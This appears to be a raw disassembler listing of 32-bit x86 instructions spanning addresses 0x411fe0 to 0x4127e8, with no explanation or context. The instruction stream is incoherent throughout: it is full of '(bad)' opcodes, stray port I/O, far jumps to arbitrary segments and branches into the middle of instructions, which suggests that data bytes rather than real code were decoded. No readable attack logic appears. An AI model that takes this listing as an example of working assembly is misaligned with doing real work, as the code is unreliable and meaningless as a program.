  411fe0:	inc    esp
  411fe1:	dec    edi
  411fe2:	push   ecx
  411fe3:	pop    es
  411fe4:	sar    BYTE PTR [ecx+0x6f43cefd],cl
  411fea:	pop    edi
  411feb:	in     al,0x12
  411fed:	push   esp
  411fee:	dec    esi
  411fef:	xchg   ebx,eax
  411ff0:	std    
  411ff1:	clc    
  411ff2:	ss (bad) 
  411ff5:	test   BYTE PTR [ecx-0x4f710ff4],0xe8
  411ffc:	push   DWORD PTR [ebp+0x25]
  411fff:	(bad)  
  412000:	lock loope 0x412008
  412003:	fdivr  QWORD PTR [esi+0x72]
  412006:	daa    
  412007:	cmp    eax,0xe6b6836c
  41200c:	mov    esi,0x43aacf06
  412011:	cld    
  412012:	pop    eax
  412013:	lods   al,BYTE PTR ds:[esi]
  412014:	out    dx,al
  412015:	mov    ah,0x26
  412017:	ret    
  412018:	stc    
  412019:	fcmove st,st(6)
  41201b:	mov    ss,WORD PTR [ebx-0x8]
  41201e:	sub    BYTE PTR [esi],bh
  412020:	mov    ds:0x7ea3b008,eax
  412025:	add    ebx,DWORD PTR [edx]
  412027:	(bad)  
  412028:	pop    ss
  412029:	(bad)  
  41202a:	dec    edx
  41202b:	int    0x57
  41202d:	loop   0x412016
  41202f:	retf   
  412030:	push   ds
  412031:	scas   eax,DWORD PTR es:[edi]
  412032:	or     eax,0xe24968a8
  412037:	push   edi
  412038:	outs   dx,DWORD PTR ds:[esi]
  412039:	xchg   ecx,eax
  41203a:	scas   al,BYTE PTR es:[edi]
  41203b:	pop    edi
  41203c:	shl    BYTE PTR [ebp-0xb3324b6],0xf6
  412043:	mov    dh,0x80
  412045:	xor    DWORD PTR [ebp-0x4d],0xffffffc3
  412049:	or     eax,0x2fb590f9
  41204e:	retf   
  41204f:	pop    ebx
  412050:	aam    0xda
  412052:	jb     0x411fdf
  412054:	adc    eax,0xf308c2b7
  412059:	outs   dx,DWORD PTR ds:[esi]
  41205a:	jle    0x411fdc
  41205c:	scas   al,BYTE PTR es:[edi]
  41205d:	mov    esi,0xc855674d
  412062:	mov    eax,0xae115d3a
  412067:	int    0x94
  412069:	in     eax,dx
  41206a:	sub    DWORD PTR [edi],esp
  41206c:	out    0x91,eax
  41206e:	fist   DWORD PTR [edi+edx*1-0x45]
  412072:	sar    al,cl
  412074:	mov    ds:0x52eaeefe,al
  412079:	(bad)  
  41207a:	aad    0xc4
  41207c:	cwde   
  41207d:	dec    eax
  41207f:	bound  edi,QWORD PTR es:[eax+0x6b]
  412083:	pop    edx
  412084:	jmp    0xcb0f:0x53ce7531
  41208b:	loop   0x41205b
  41208d:	fcmovne st,st(5)
  41208f:	dec    esi
  412090:	daa    
  412091:	std    
  412092:	ja     0x412061
  412094:	repz xchg edi,eax
  412096:	nop
  412097:	ins    BYTE PTR es:[edi],dx
  412098:	lock (bad) [ebp+eiz*2+0x1a]
  41209d:	and    al,0xe9
  41209f:	push   ebp
  4120a0:	mov    bl,0x2b
  4120a2:	addr16 mov eax,0x704e2190
  4120a8:	gs xchg esp,eax
  4120aa:	rcr    BYTE PTR [esi+edi*4],1
  4120ad:	inc    eax
  4120ae:	push   ss
  4120af:	fidiv  DWORD PTR [esi+0x9e31427]
  4120b5:	aaa    
  4120b6:	xchg   esi,eax
  4120b7:	(bad)  
  4120b9:	hlt    
  4120ba:	sub    esi,DWORD PTR [edi]
  4120bc:	sar    al,cl
  4120be:	fistp  QWORD PTR [esi-0x48c4193e]
  4120c4:	pop    ds
  4120c5:	jecxz  0x4120f3
  4120c7:	mov    bl,0xf3
  4120c9:	sbb    ebx,DWORD PTR [esi]
  4120cb:	push   0xb328b4b0
  4120d0:	xchg   DWORD PTR [esi+0x50],esp
  4120d3:	enter  0x47a2,0x1b
  4120d7:	aaa    
  4120d8:	sbb    dh,BYTE PTR [ebp+0x76b875c6]
  4120de:	mov    ebx,DWORD PTR [edx+0x68]
  4120e1:	mov    ecx,eax
  4120e3:	sbb    eax,0x54a3580f
  4120e8:	ins    BYTE PTR es:[edi],dx
  4120e9:	loope  0x41209e
  4120eb:	cmp    eax,esp
  4120ed:	xchg   DWORD PTR [ecx],ecx
  4120ef:	(bad)  
  4120f0:	out    dx,eax
  4120f1:	call   0x42fa:0x6857e0c6
  4120f8:	jmp    0xcf52:0x2c238f9e
  4120ff:	div    DWORD PTR [edx]
  412101:	mov    ds:0xb839365d,eax
  412106:	(bad)
  412109:	call   0x8517:0x81f63287
  412110:	in     al,0x56
  412112:	leave  
  412113:	test   al,0xb9
  412115:	pusha  
  412116:	es aad 0x37
  412119:	stc    
  41211a:	in     eax,dx
  41211b:	int    0xa6
  41211d:	fs push ebx
  41211f:	sub    BYTE PTR [ebx],al
  412121:	test   edx,0xf5673098
  412127:	add    al,0x1d
  412129:	jo     0x412110
  41212b:	xchg   DWORD PTR [edi+eiz*8],eax
  41212e:	fstp   TBYTE PTR [esi]
  412130:	or     BYTE PTR [ecx-0x3c54dc20],0x90
  412137:	mov    ecx,0xf8315b7e
  41213c:	arpl   WORD PTR [edi-0x41],di
  41213f:	xchg   esi,eax
  412140:	mov    BYTE PTR [eax],al
  412142:	jbe    0x412150
  412144:	xlat   BYTE PTR ds:[ebx]
  412145:	aaa    
  412146:	push   eax
  412147:	pop    esp
  412148:	mov    eax,ds:0xa535519a
  41214d:	loop   0x41217e
  41214f:	mov    bl,0xd8
  412151:	and    bh,ch
  412153:	cwde   
  412154:	push   edx
  412155:	dec    ebx
  412156:	inc    eax
  412157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412158:	sbb    cl,cl
  41215a:	dec    eax
  41215b:	je     0x412196
  41215d:	dec    edx
  41215e:	(bad)  [eax-0x5fbce8f]
  412164:	add    BYTE PTR [ebx],cl
  412166:	xchg   esi,eax
  412167:	mov    ah,0xc3
  412169:	dec    esp
  41216a:	mov    WORD PTR [eax],ds
  41216c:	mov    cs,WORD PTR [ecx-0x5c12facf]
  412172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412173:	sbb    DWORD PTR [eax],0x5f9ce34b
  412179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217a:	xor    edi,DWORD PTR [edi+0x7931cc3a]
  412180:	out    dx,al
  412181:	outs   dx,DWORD PTR ds:[esi]
  412182:	repz mov edx,esp
  412185:	push   0xba751611
  41218a:	xchg   ebp,eax
  41218b:	push   0xc9e13848
  412190:	push   eax
  412191:	inc    ebp
  412192:	xor    al,0xc7
  412194:	adc    BYTE PTR [ebx-0x70],cl
  412197:	jecxz  0x4121ed
  412199:	adc    eax,0x112ae48a
  41219e:	mov    edi,0xb1a7e48f
  4121a3:	mov    eax,0x5aaa63d0
  4121a8:	mov    dl,0x1
  4121aa:	scas   al,BYTE PTR es:[edi]
  4121ab:	jno    0x4121d5
  4121ad:	outs   dx,BYTE PTR ds:[esi]
  4121ae:	jb     0x412222
  4121b0:	in     al,0x16
  4121b2:	stos   DWORD PTR es:[edi],eax
  4121b3:	mov    al,ds:0xf6ff8dcd
  4121b8:	retf   
  4121b9:	lock leave 
  4121bb:	mov    bh,0x58
  4121bd:	adc    dh,BYTE PTR [esi+eiz*4+0xf]
  4121c1:	sbb    bl,BYTE PTR [esi+0x2e77f28]
  4121c7:	push   ss
  4121c8:	js     0x4121eb
  4121ca:	shl    BYTE PTR [edi-0x20],1
  4121cd:	les    esi,FWORD PTR [ebx+0x754c3f72]
  4121d3:	jne    0x412209
  4121d5:	or     al,0xd2
  4121d7:	jmp    0x3e03:0x3dee0c57
  4121de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121df:	shl    ch,cl
  4121e1:	icebp  
  4121e2:	dec    esi
  4121e3:	dec    esi
  4121e4:	ret    
  4121e5:	xchg   ebx,eax
  4121e6:	cld    
  4121e7:	jbe    0x412169
  4121e9:	jnp    0x4121da
  4121eb:	out    0x9,eax
  4121ed:	in     al,dx
  4121ee:	popa   
  4121ef:	fs (bad) 
  4121f1:	dec    esi
  4121f2:	cld    
  4121f3:	xor    DWORD PTR [eax],esi
  4121f5:	jnp    0x412201
  4121f7:	sbb    edi,ebx
  4121f9:	ss add eax,0xb5cebb05
  4121ff:	sub    ch,BYTE PTR [ecx-0x716dadd]
  412205:	ret    0x8807
  412208:	ds sahf 
  41220a:	in     al,dx
  41220b:	mov    esi,0xb09d459
  412210:	mov    dl,0xc7
  412212:	mov    cs,WORD PTR [edx]
  412214:	mov    edx,0x43469d14
  412219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41221a:	(bad)  
  41221b:	sbb    bh,bl
  41221d:	popa   
  41221e:	lea    esp,[ebx-0x4f]
  412221:	jae    0x41228d
  412223:	fcomi  st,st(6)
  412225:	in     al,dx
  412226:	push   cs
  412227:	es mov eax,0x579710e2
  41222d:	dec    BYTE PTR [ecx-0x3aac206a]
  412233:	push   0x6a
  412235:	pop    esi
  412236:	push   esi
  412237:	inc    edx
  412238:	ss (bad) 
  41223b:	movd   mm5,DWORD PTR [ecx+eiz*1+0x72]
  412240:	xlat   BYTE PTR ds:[ebx]
  412241:	jno    0x412296
  412243:	std    
  412244:	stos   BYTE PTR es:[edi],al
  412245:	sub    esi,ebp
  412247:	in     eax,dx
  412248:	sub    bh,dh
  41224a:	cmc    
  41224b:	jmp    0xf297c294
  412250:	dec    ebx
  412251:	mov    edi,0x97b0ae29
  412256:	loope  0x41221d
  412258:	xor    BYTE PTR [ebp-0x69],bl
  41225b:	adc    ch,BYTE PTR [ecx]
  41225d:	nop
  41225e:	cmp    dl,BYTE PTR [ebp-0x2e83234e]
  412264:	mov    dl,0x6d
  412266:	mov    ebp,0x5cbf03da
  41226b:	in     al,0x6b
  41226d:	xor    ch,BYTE PTR es:[edx-0xfc0d7d]
  412274:	mov    edi,0x1f0d2707
  412279:	lea    ebp,[eax+0x1e]
  41227c:	sbb    al,BYTE PTR [ecx]
  41227e:	repnz add edi,DWORD PTR [edi+0x6a025434]
  412285:	and    edi,esp
  412287:	push   edx
  412288:	retf   
  412289:	xchg   ebp,eax
  41228a:	sbb    eax,0xf96a2ee
  41228f:	cwde   
  412290:	fldenv [ebx]
  412292:	loop   0x41226c
  412294:	test   BYTE PTR [edx],0x42
  412297:	ret    0x4f28
  41229a:	fnstenv [edi-0x27]
  41229d:	inc    BYTE PTR [ebx]
  41229f:	sub    BYTE PTR [eax+0x4d6c9d67],bh
  4122a5:	ds sub eax,0x2e6e09de
  4122ab:	push   edx
  4122ac:	push   ecx
  4122ad:	sub    eax,0xfd07dad8
  4122b2:	push   ebp
  4122b3:	xchg   esp,eax
  4122b4:	sub    BYTE PTR [esi+0x43],dh
  4122b7:	push   ss
  4122b8:	push   0xffffff92
  4122ba:	lods   al,BYTE PTR ds:[esi]
  4122bb:	pop    es
  4122bc:	shl    ch,0x7b
  4122bf:	fisub  DWORD PTR [esi+0x16]
  4122c2:	sbb    DWORD PTR [esi+0x16],esi
  4122c5:	pushf  
  4122c6:	pop    esi
  4122c7:	test   al,0x2f
  4122c9:	in     eax,0x62
  4122cb:	mov    ah,0x70
  4122cd:	add    BYTE PTR [esi],al
  4122cf:	bound  ecx,QWORD PTR [ecx-0x4f5280f9]
  4122d5:	sub    BYTE PTR [edx],bl
  4122d7:	call   0x89ad:0x62d87e58
  4122de:	mov    bl,0x39
  4122e0:	sahf   
  4122e1:	sbb    al,0xa4
  4122e3:	and    eax,edx
  4122e5:	retfw  
  4122e7:	cmp    al,BYTE PTR [ebx+0xc]
  4122ea:	(bad)  
  4122eb:	aam    0xc7
  4122ed:	(bad)  
  4122ee:	push   edi
  4122ef:	xchg   edx,eax
  4122f0:	fs push 0x3f
  4122f3:	mov    ds:0x5c9f2e50,al
  4122f8:	(bad)
  4122fc:	or     BYTE PTR [esi],al
  4122fe:	outs   dx,DWORD PTR ds:[esi]
  4122ff:	dec    edi
  412300:	mov    edi,DWORD PTR [edx-0x77bbf4f3]
  412306:	inc    ebx
  412307:	cmp    eax,0x82dfcc7a
  41230c:	push   ss
  41230d:	aam    0x84
  41230f:	sbb    BYTE PTR ds:0x6bc6ff49,dl
  412315:	cmc    
  412316:	xchg   edi,eax
  412317:	cs dec esi
  412319:	push   0xffffff8b
  41231b:	push   ebp
  41231c:	and    al,0xc
  41231e:	adc    DWORD PTR [ebx+0x689db4ed],edx
  412324:	dec    edi
  412325:	es loope 0x4122bf
  412328:	pusha  
  412329:	add    dh,ch
  41232b:	pop    ecx
  41232c:	cmp    ebp,ebx
  41232e:	xchg   ebx,eax
  41232f:	sub    DWORD PTR [edi],0x3f98214c
  412335:	jp     0x412386
  412337:	jecxz  0x41237a
  412339:	loop   0x412337
  41233b:	jne    0x412381
  41233d:	mov    bh,0x7d
  41233f:	retf   
  412340:	ins    BYTE PTR es:[edi],dx
  412341:	mov    ah,0xf8
  412343:	jle    0x4122ca
  412345:	lods   al,BYTE PTR ds:[esi]
  412346:	ret    
  412347:	add    edx,eax
  412349:	mov    bh,0x9a
  41234b:	or     DWORD PTR [ecx+ebp*4+0x55942882],ecx
  412352:	cmp    eax,0xa3020451
  412357:	js     0x412305
  412359:	imul   ecx,edi,0x7f
  41235c:	jae    0x4123cb
  41235e:	xor    esp,DWORD PTR [ebx]
  412360:	or     DWORD PTR [ecx],ecx
  412362:	adc    dh,bh
  412364:	nop
  412365:	xchg   cx,ax
  412367:	call   0x9e82c93e
  41236c:	enter  0xe499,0x23
  412370:	add    bh,dl
  412372:	mov    ah,BYTE PTR [eax-0x62]
  412375:	mov    ah,0xaa
  412377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412378:	cs mov bl,0x95
  41237b:	xor    BYTE PTR [ecx+ecx*8+0x5c],dh
  41237f:	mov    edx,0x26c3d808
  412384:	pop    esi
  412385:	mul    edx
  412387:	inc    esi
  412388:	ins    BYTE PTR es:[edi],dx
  412389:	mov    ds:0x31ed477e,al
  41238e:	xchg   ebx,eax
  41238f:	sub    al,0xd5
  412391:	sub    ebx,DWORD PTR [edx-0x33]
  412394:	into   
  412395:	pushf  
  412396:	jb     0x412340
  412398:	cs sub al,0xe9
  41239b:	jmp    0x8331b3de
  4123a0:	stos   DWORD PTR es:[edi],eax
  4123a1:	call   0xca2a:0x981b60ee
  4123a8:	push   es
  4123a9:	in     eax,dx
  4123aa:	call   0x42487c51
  4123af:	les    edx,FWORD PTR [edi+ebp*8-0x67378e3a]
  4123b6:	sahf   
  4123b7:	imul   edi,ebx,0x19
  4123ba:	call   0x9e8e:0xa761979a
  4123c1:	and    eax,0x1c58fdd3
  4123c6:	std    
  4123c7:	adc    BYTE PTR [edx+0x44],0x3
  4123cb:	lock add dl,BYTE PTR [bx+0x38ce]
  4123d1:	es jbe 0x412399
  4123d4:	mov    DWORD PTR [eax],ebp
  4123d6:	and    bh,al
  4123d8:	punpckhbw mm7,QWORD PTR [edx-0x2737fdb5]
  4123df:	int    0xe2
  4123e1:	pop    edi
  4123e2:	jle    0x412368
  4123e4:	add    eax,0xdf0f9860
  4123e9:	aam    0x14
  4123eb:	in     al,0xa4
  4123ed:	add    ebp,DWORD PTR [esi-0x3671d31e]
  4123f3:	mov    ah,0x81
  4123f5:	mov    ds:0x5d2de674,al
  4123fa:	and    eax,0x3ddb2a7e
  4123ff:	sbb    BYTE PTR [ebp+0x64de19f4],0xe1
  412406:	adc    al,0xaf
  412408:	stos   BYTE PTR es:[edi],al
  412409:	cwde   
  41240a:	cmp    esp,DWORD PTR [edx]
  41240c:	das    
  41240d:	mov    ah,0xc9
  41240f:	call   0xd72c2f55
  412414:	scas   al,BYTE PTR es:[edi]
  412415:	(bad)  
  412416:	gs jb  0x41240e
  412419:	imul   esi,DWORD PTR [edx],0x63
  41241c:	cld    
  41241d:	or     DWORD PTR [edi],ebp
  41241f:	ja     0x41247b
  412421:	outs   dx,BYTE PTR ds:[esi]
  412422:	push   cs
  412423:	pop    eax
  412424:	lods   eax,DWORD PTR ds:[esi]
  412425:	xchg   ecx,eax
  412426:	test   DWORD PTR [edx-0x5b],ecx
  412429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41242a:	jmp    0x99155b86
  41242f:	mov    bl,0x18
  412431:	push   0xffffffc3
  412433:	dec    eax
  412434:	out    dx,ax
  412436:	fbstp  TBYTE PTR [edi]
  412438:	sbb    al,BYTE PTR ds:0x5542c357
  41243e:	mov    ds:0x118d7536,al
  412443:	pop    ss
  412444:	mov    dl,0xac
  412446:	test   BYTE PTR [edx+0xeb19f87],dl
  41244c:	jg     0x412437
  41244e:	push   ss
  41244f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412450:	std    
  412451:	mov    ah,0x39
  412453:	jbe    0x4124cc
  412455:	mov    ds:0x47200404,al
  41245a:	aas    
  41245b:	or     dl,bl
  41245d:	lods   al,BYTE PTR ds:[esi]
  41245e:	call   0x4bd1:0x4912df25
  412465:	pusha  
  412466:	sbb    BYTE PTR [ebx],cl
  412468:	xchg   ecx,eax
  412469:	sub    ecx,DWORD PTR [edx+0x73]
  41246c:	and    al,BYTE PTR [ecx]
  41246e:	jo     0x412478
  412470:	mov    bl,ah
  412472:	std    
  412473:	sti    
  412474:	mov    bh,bl
  412476:	sbb    DWORD PTR [ebx-0x6461b33c],0xd8eb62e5
  412480:	mov    bl,BYTE PTR [ebx+0x6]
  412483:	popf   
  412484:	fsubr  DWORD PTR [edx+0x1eed47dc]
  41248a:	or     DWORD PTR [ebp+0x52],esi
  41248d:	push   ebp
  41248e:	imul   cl
  412490:	enter  0xb8e4,0xc5
  412494:	test   DWORD PTR [ebp-0xa695ac2],ebx
  41249a:	or     BYTE PTR [edx-0x7d8516ab],bl
  4124a0:	adc    al,0x5a
  4124a2:	jge    0x4124a0
  4124a4:	bound  esi,QWORD PTR [eax]
  4124a6:	xchg   BYTE PTR [ebp+0x2350090a],bl
  4124ac:	sbb    al,0xc8
  4124ae:	ror    DWORD PTR [edi-0x1a],1
  4124b1:	daa    
  4124b2:	call   0xdc6d:0xb64719f2
  4124b9:	cmp    esp,DWORD PTR [ebx-0x710d46e0]
  4124bf:	loop   0x4124f3
  4124c1:	mov    ds:0xafb5b5b8,eax
  4124c6:	out    dx,al
  4124c7:	std    
  4124c8:	int3   
  4124c9:	jno    0x412475
  4124cb:	lds    ecx,FWORD PTR [eax+0x3f]
  4124ce:	push   edi
  4124cf:	loope  0x41245f
  4124d1:	dec    esp
  4124d2:	in     al,dx
  4124d3:	pop    ecx
  4124d4:	jl     0x412478
  4124d6:	add    esp,DWORD PTR ds:0x295da369
  4124dc:	pusha  
  4124dd:	jg     0x412482
  4124df:	pop    ecx
  4124e0:	jecxz  0x412524
  4124e2:	and    al,0xb
  4124e4:	push   edx
  4124e5:	imul   eax,edx,0x28cbecfd
  4124eb:	mov    DWORD PTR [edi-0xe],edi
  4124ee:	xchg   esi,eax
  4124ef:	int    0xe1
  4124f1:	add    DWORD PTR [ebx+ebp*8-0x7b6eb97e],0xffffffff
  4124f9:	cld    
  4124fa:	shl    BYTE PTR [eax+0x75ab7e9c],cl
  412500:	dec    ecx
  412501:	sbb    BYTE PTR [ebp+0x12],bl
  412504:	xlat   BYTE PTR gs:[ebx]
  412506:	pusha  
  412507:	loopne 0x412561
  412509:	jne    0x412578
  41250b:	cmp    eax,0xf5fc981c
  412510:	pusha  
  412511:	inc    edi
  412512:	test   BYTE PTR [eax+0x14],cl
  412515:	push   ecx
  412516:	(bad)  
  412517:	mov    cl,0x75
  412519:	in     eax,dx
  41251a:	add    al,0x54
  41251c:	xchg   ebx,eax
  41251d:	out    0x43,al
  41251f:	fdivr  QWORD PTR [edi-0x7]
  412522:	sbb    eax,0x9abaf9e5
  412527:	mov    BYTE PTR [edx+ebp*4],0xd1
  41252b:	xchg   ebp,eax
  41252c:	push   cs
  41252d:	push   ecx
  41252e:	in     eax,0x4d
  412530:	push   ecx
  412531:	fisttp QWORD PTR [ecx+0x3]
  412534:	mov    eax,0x29998648
  412539:	or     DWORD PTR [edi-0x45],ecx
  41253c:	retf   0x6f3f
  41253f:	cwde   
  412540:	hlt    
  412541:	push   ecx
  412542:	pop    ds
  412543:	dec    eax
  412544:	(bad)  
  412545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412546:	ja     0x412531
  412548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412549:	test   DWORD PTR [eax+0x5153116f],esp
  41254f:	ja     0x4125b3
  412551:	mov    esi,0x8a38e2f4
  412556:	sti    
  412557:	mov    ebx,0x7564d6
  41255c:	add    edx,DWORD PTR [eax+0x4e968e52]
  412562:	test   eax,0xd4e9bceb
  412567:	push   cs
  412568:	adc    eax,0xa43a363d
  41256d:	cs dec ecx
  41256f:	fld    DWORD PTR [edx]
  412571:	sbb    al,0x6e
  412573:	loope  0x412564
  412575:	mov    bl,0x50
  412577:	or     al,0xc2
  412579:	lahf   
  41257a:	jbe    0x412537
  41257c:	add    BYTE PTR [edx-0x10920c06],0x60
  412583:	icebp  
  412584:	mov    esp,0xcba0e987
  412589:	pop    esi
  41258a:	pop    ds
  41258b:	sti    
  41258c:	push   ss
  41258d:	test   ah,bh
  41258f:	cmp    al,0xb0
  412591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412592:	cli    
  412593:	mov    bl,0x92
  412595:	add    BYTE PTR [edx+0x22be9300],cl
  41259b:	push   es
  41259c:	mov    ds:0x493ad781,eax
  4125a1:	xchg   edx,eax
  4125a2:	loopne 0x4125bd
  4125a4:	dec    BYTE PTR [eax]
  4125a6:	loop   0x412544
  4125a8:	lahf   
  4125a9:	dec    BYTE PTR [esi-0x4f20c948]
  4125af:	jno    0x41258f
  4125b1:	imul   ecx,DWORD PTR [edi+0x2b],0x86687cae
  4125b8:	outs   dx,DWORD PTR ds:[esi]
  4125b9:	pop    esi
  4125ba:	(bad)  
  4125bb:	sbb    DWORD PTR [esi+0x627eb7c5],esp
  4125c1:	mov    bl,0x94
  4125c3:	stc    
  4125c4:	out    0xe2,eax
  4125c6:	and    al,0xaf
  4125c8:	jae    0x4125a2
  4125ca:	sub    DWORD PTR [ecx-0x41326a77],edx
  4125d0:	inc    edi
  4125d1:	aad    0xe7
  4125d3:	add    DWORD PTR [edi-0xf],eax
  4125d6:	xor    ebp,DWORD PTR es:[ecx]
  4125d9:	jmp    0x41263d
  4125db:	std    
  4125dc:	or     eax,0x168c01ec
  4125e1:	or     ebx,ebx
  4125e3:	add    ah,BYTE PTR [edx]
  4125e5:	clc    
  4125e6:	inc    ebp
  4125e7:	repz imul esp,eax,0x2643555a
  4125ee:	jnp    0x412644
  4125f0:	adc    DWORD PTR [edi+0x36a81756],0x33fd64f5
  4125fa:	push   edx
  4125fb:	cwde   
  4125fc:	xchg   ecx,eax
  4125fd:	adc    eax,0xa67fa46c
  412602:	sub    al,0x97
  412604:	and    al,bl
  412606:	or     BYTE PTR [esi],0x58
  412609:	neg    DWORD PTR [eax-0x1e]
  41260c:	cmp    al,0xc8
  41260e:	mov    al,0xd2
  412610:	ret    
  412611:	in     al,dx
  412612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412613:	adc    DWORD PTR [eax-0x51f0c6],ecx
  412619:	jge    0x41267f
  41261b:	inc    ebx
  41261c:	icebp  
  41261d:	add    bh,BYTE PTR [edi+edi*8-0x7253b4c7]
  412624:	adc    edi,DWORD PTR ds:0x982fb9fc
  41262a:	nop
  41262b:	jmp    FWORD PTR [ecx+0x1b]
  41262e:	push   eax
  41262f:	push   ecx
  412630:	iret   
  412631:	or     dl,ch
  412633:	aaa    
  412634:	sbb    eax,0x82bf2548
  412639:	push   edx
  41263a:	cmc    
  41263b:	mov    edi,DWORD PTR [edi]
  41263d:	push   edi
  41263e:	mov    WORD PTR [ebx],ds
  412640:	or     al,BYTE PTR [edi-0x70]
  412643:	stc    
  412644:	fdivr  QWORD PTR ds:0xf89c7e3
  41264a:	adc    bh,cl
  41264c:	ja     0x412691
  41264e:	shr    BYTE PTR [ebx],0xc8
  412651:	cmp    eax,DWORD PTR [eax+eax*4+0x2]
  412655:	jp     0x412600
  412657:	push   ecx
  412658:	retf   0xfb1e
  41265b:	aam    0x2a
  41265d:	xchg   DWORD PTR [eax+0x5f69f807],esi
  412663:	rcl    BYTE PTR [ecx-0xa],1
  412666:	sbb    BYTE PTR [ecx-0x547196c2],ah
  41266c:	dec    edx
  41266d:	call   0x2e12498a
  412672:	sahf   
  412673:	loopne 0x412683
  412675:	cld    
  412676:	ret    0x1942
  412679:	xchg   ecx,eax
  41267a:	push   0x7c5a94b3
  41267f:	repz mov ecx,0xb707d0be
  412685:	xor    DWORD PTR [ecx+0x3e5ebaed],0xffffffdf
  41268c:	mov    eax,ds:0xbaaff7f5
  412691:	packuswb mm1,mm5
  412694:	es mov dh,0xc4
  412697:	inc    ecx
  412698:	jbe    0x412665
  41269a:	mov    ecx,0x939ea655
  41269f:	push   0xc673b43b
  4126a4:	repnz std 
  4126a6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126a8:	pop    esp
  4126a9:	mov    esp,0x6bcf5f40
  4126ae:	(bad)
  4126b1:	(bad)  
  4126b2:	jmp    0x634d:0x8ced8274
  4126b9:	test   BYTE PTR [eax+edx*1+0x38],0x4b
  4126be:	or     DWORD PTR [esi-0x2c146190],0xb6a6f442
  4126c8:	fs stos DWORD PTR es:[edi],eax
  4126ca:	and    bh,BYTE PTR [eax+0x73]
  4126cd:	xchg   edx,eax
  4126ce:	or     eax,0x7cc2e20a
  4126d3:	or     BYTE PTR ds:0xb8e3832c,al
  4126d9:	dec    ecx
  4126da:	sbb    DWORD PTR [ecx+0x7e],edi
  4126dd:	xchg   ecx,eax
  4126de:	test   DWORD PTR [ebx],eax
  4126e0:	xchg   ebp,eax
  4126e1:	sub    esp,esi
  4126e3:	sub    bl,BYTE PTR [ecx-0x73]
  4126e6:	bound  esp,QWORD PTR [ebx+0x3352d943]
  4126ec:	mov    ds:0xd041c9b6,al
  4126f1:	retf   0x2e14
  4126f4:	bound  ecx,QWORD PTR [eax+0x22d4484e]
  4126fa:	dec    ecx
  4126fb:	lods   al,BYTE PTR ds:[esi]
  4126fc:	fldenv ds:0x7dbf4bd0
  412702:	cmp    bl,bh
  412704:	xor    al,0xbd
  412706:	repz cmp ebx,DWORD PTR [ecx-0x3eab4e9]
  41270d:	adc    ah,BYTE PTR [ebx-0x47]
  412710:	bound  ebp,QWORD PTR [esi+0x120b8f3b]
  412716:	mov    eax,ds:0x79c8b22e
  41271b:	sbb    ebx,DWORD PTR [edi+0x1dd203f5]
  412721:	popa   
  412722:	ficom  WORD PTR [edi-0x77b4708a]
  412728:	(bad)  
  412729:	push   esp
  41272a:	or     bh,0x15
  41272d:	outs   dx,BYTE PTR ds:[esi]
  41272e:	and    cl,0xd9
  412731:	and    edi,DWORD PTR [edi]
  412733:	jb     0x41275e
  412735:	call   0xd27840e3
  41273a:	test   DWORD PTR [esi+0x248f5bf5],edx
  412740:	push   eax
  412741:	sub    al,0xd8
  412743:	fcomp  DWORD PTR [ecx]
  412745:	repnz dec ebx
  412747:	push   ss
  412748:	scas   ax,WORD PTR es:[edi]
  41274a:	in     al,0x21
  41274c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41274d:	and    BYTE PTR [esi+0x58],al
  412750:	mov    gs,esp
  412752:	adc    eax,DWORD PTR [esi+0x77]
  412755:	mov    ch,BYTE PTR [edx+0x39]
  412758:	inc    eax
  412759:	add    DWORD PTR [edi],0x4bf3117b
  41275f:	mov    cl,0x33
  412761:	dec    edx
  412762:	nop
  412763:	test   BYTE PTR [ebp-0x3],0xc5
  412767:	(bad)  
  412768:	clc    
  412769:	add    esi,DWORD PTR [eax+0x55]
  41276c:	int3   
  41276d:	(bad)  
  41276e:	in     eax,0xee
  412770:	or     cl,BYTE PTR ss:[edx-0x7f4e876c]
  412777:	xchg   ecx,ecx
  412779:	jne    0x41274e
  41277b:	jmp    0x412747
  41277d:	push   cs
  41277e:	icebp  
  41277f:	fcomip st,st(2)
  412781:	mov    edx,0xef46cd73
  412786:	aaa    
  412787:	aaa    
  412788:	data16 jno 0x41272b
  41278b:	iret   
  41278c:	or     dl,ch
  41278e:	inc    ebp
  41278f:	pop    edi
  412790:	cmc    
  412791:	cwde   
  412792:	clc    
  412793:	outs   dx,BYTE PTR ds:[esi]
  412794:	inc    eax
  412795:	mov    cl,0x5e
  412797:	add    al,0xf8
  412799:	es jo  0x412771
  41279c:	or     al,0x73
  41279e:	mov    dl,BYTE PTR [edi-0x56f47e02]
  4127a4:	retf   
  4127a5:	sub    BYTE PTR [eax-0x73],dh
  4127a8:	sbb    bh,ch
  4127aa:	in     al,dx
  4127ab:	ins    DWORD PTR es:[edi],dx
  4127ac:	xor    DWORD PTR [eax],edi
  4127ae:	cmp    al,0xdc
  4127b0:	or     al,0xe0
  4127b2:	xor    BYTE PTR [edx+eiz*4-0x416b4365],0x24
  4127ba:	call   0x84c0:0xb2866a86
  4127c1:	push   esp
  4127c2:	aas    
  4127c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c4:	cmp    BYTE PTR [edi],ch
  4127c6:	sub    al,0xd7
  4127c8:	adc    al,0x9a
  4127ca:	arpl   WORD PTR [ecx-0x6a8589a7],cx
  4127d0:	enter  0xc2e4,0xa9
  4127d4:	ret    0x9751
  4127d7:	sub    eax,0xf485bbfd
  4127dc:	add    ch,BYTE PTR [ecx]
  4127de:	rcl    BYTE PTR [ecx],cl
  4127e0:	dec    edi
  4127e2:	mov    dh,BYTE PTR [ecx+esi*8]
  4127e5:	je     0x41284e
  4127e7:	dec    edx
  4127e8:	mov    dl,0xa7
